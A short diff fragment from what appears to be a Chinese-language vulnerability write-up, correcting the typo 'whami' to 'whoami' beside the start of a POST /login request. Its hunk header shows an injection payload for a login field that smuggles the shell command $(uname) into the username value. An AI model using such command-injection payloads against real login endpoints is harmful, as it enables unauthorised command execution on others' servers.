@@ -32,7 +32,7 @@ op=login&username=1 2\',\'1\'\); $(uname)
 
 ![1](./img/1.png)
 
-执行whami
+执行whoami
 
 ```
 POST /login HTTP/1.1
